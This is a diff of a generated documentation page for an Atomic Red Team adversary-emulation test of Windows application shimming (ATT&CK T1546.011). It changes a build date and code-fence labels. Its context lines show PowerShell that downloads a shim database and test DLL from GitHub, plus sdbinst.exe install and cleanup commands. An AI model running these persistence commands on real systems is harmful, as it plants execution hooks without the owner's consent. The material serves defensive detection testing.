@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.011"
 attack_technique_name: "Event Triggered Execution: Application Shimming"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "9ab27e22-ee62-4211-962b-d36d9a0e6a18"
@@ -56,13 +56,13 @@ Shim database file must exist on disk at specified location (#{file_path})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{file_path}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory (split-path "#{file_path}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
@@ -72,13 +72,13 @@ AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
 ```
@@ -90,13 +90,13 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 sdbinst.exe "#{file_path}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 sdbinst.exe -u "#{file_path}" >nul 2>&1
 ```
 
